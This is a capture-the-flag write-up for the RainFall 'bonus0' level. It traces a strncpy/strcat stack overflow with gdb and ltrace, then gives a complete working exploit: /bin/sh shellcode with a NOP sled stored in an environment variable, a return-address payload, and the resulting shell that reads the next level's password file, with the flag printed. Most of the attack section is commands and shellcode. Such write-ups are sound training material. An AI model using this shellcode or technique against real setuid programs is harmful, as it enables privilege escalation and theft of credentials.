# We have a executable "bonus0" lets do some test!

>bonus0@RainFall:~$ ./bonus0
 - 
test
 - 
test test
test test test
>bonus0@RainFall:~$ ./bonus0
 - 
AAAAAAAAAAAA
 - 
BBBBBBBBBBBB
AAAAAAAAAAAA BBBBBBBBBBBB
>bonus0@RainFall:~$

# The program listen to stdin, after two arguments write both arguments.

# Let's use gdb

(gdb) disas main
[...]
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
[...]

# There is a function called pp

(gdb) disas pp
[...]
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
   0x0804854f <+49>:	mov    %eax,0x4(%esp)
   0x08048553 <+53>:	mov    0x8(%ebp),%eax
   0x08048556 <+56>:	mov    %eax,(%esp)
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
[...]
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
[...]

# pp call p, strcpy and strcat

(gdb) disas p
[...]
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
[...]
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
[...]

# And the p function call puts and read.

# So the program puts a " - " first, after read stdin and strncpy the string. Repeat this one time and create a new string and concatenate arg1 and arg2

# Let's use ltrace to see if we are right

>bonus0@RainFall:~$ ltrace ./bonus0
__libc_start_main(0x80485a4, 1, 0xbffff6f4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - 
)                                                                                                                   = 4
read(0, AAAAAAAAA
"AAAAAAAAA\n", 4096)                                                                                                  = 10
strchr("AAAAAAAAA\n", '\n')                                                                                                   = "\n"
strncpy(0xbffff5d8, "AAAAAAAAA", 20)                                                                                          = 0xbffff5d8
puts(" - " - 
)                                                                                                                   = 4
read(0, BBBBBBBBBBB
"BBBBBBBBBBB\n", 4096)                                                                                                = 12
strchr("BBBBBBBBBBB\n", '\n')                                                                                                 = "\n"
strncpy(0xbffff5ec, "BBBBBBBBBBB", 20)                                                                                        = 0xbffff5ec
strcpy(0xbffff626, "AAAAAAAAA")                                                                                               = 0xbffff626
strcat("AAAAAAAAA ", "BBBBBBBBBBB")                                                                                           = "AAAAAAAAA BBBBBBBBBBB"
puts("AAAAAAAAA BBBBBBBBBBB"AAAAAAAAA BBBBBBBBBBB
)                                                                                                 = 22
+++ exited (status 0) +++
>bonus0@RainFall:~$

# So it read 4096 character and it strncpy only 20 to small to put a shellcode in it.

# Let's return in gdb to see if we can buffer overflow this

>bonus0@RainFall:~$ gdb bonus0
[...]
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB   
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB��� BBBBBBBBBBBBBBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

# Yes eip was overwrite, now let's determine where and how

# How its because the address where strncpy copy the data are only 20 bits apart so if we enter a string of 20 character it will copy the character and at the end put a \0, but at the second strncpy the \0 for the first string will be overwrite and so when in the pp function strcpy is call it will copy both the string and the strcat will again concatenate and so overwrite eip.

# Let's calculate the padding

(gdb) b *0x080485c0
Breakpoint 1 at 0x80485c0
(gdb) i r
eax            0xbffff606	-1073744378
ecx            0xbffff5e0	-1073744416
edx            0xbffff647	-1073744313
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff5f0	0xbffff5f0
ebp            0xbffff638	0xbffff638
esi            0x0	0
edi            0x0	0
eip            0x80485c0	0x80485c0 <main+28>
eflags         0x200282	[ SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) i f
Stack level 0, frame at 0xbffff640:
 eip = 0x80485c0 in main; saved eip 0x42424242
 Arglist at 0xbffff638, args: 
 Locals at 0xbffff638, Previous frame's sp is 0xbffff640
 Saved registers:
  ebp at 0xbffff638, eip at 0xbffff63c

# The padding here is eip - eax (0xbffff63c - 0xbffff606) which is equal to 54 (decimal value)

# So we have 40 character via the strcpy plus one the strcat add between the two string so we need the 10th character of the second string to be the address

# Let's test it

(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y 
Starting program: /home/user/bonus0/bonus0
 - 
AAAAAAAAAAAAAAAAAAAAAAAAAA
 - 
BBBBBBBBBCCCCBBBBBBBBBBBBBBBBBB
AAAAAAAAAAAAAAAAAAAABBBBBBBBBCCCCBBBBBBB��� BBBBBBBBBCCCCBBBBBBB���

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()

# It work ! Now we can redirect the program somewhere. But the buffer we have is to small for a shellcode. So we need to create one via a env variable

# For that we will use env -i to have a blank environement so the address between gdb and just the program don't change to much

bonus0@RainFall:~$ env -i cmd=$(python -c "print('\x90' * 1000 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')") gdb bonus0

# Our shellcode is now on the variable cmd. To find the good address to redirect eip we will have to find it via gdb

(gdb)x/400s environ
[...]
0xbfffff2a:	 "cmd=\220\220\220\220\220...
[...]

# Find it now we choose a address en the middle of the \x90

# Now we have all the information we need

>bonus0@RainFall:~$ python -c "print('A' * 4095 + '\n' + 'B' * 9 + '\x5a\xff\xff\xbf' + 'B' * 20)" > /tmp/test
>bonus0@RainFall:~$ cat /tmp/test - | env -i cmd=$(python -c "print('\x90' * 1000 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')") ./bonus0
 - 
 - 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBZ���BBBBBBB��� BBBBBBBBBZ���BBBBBBB���
whoami
bonus1
cd ..
cd bonus1
cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
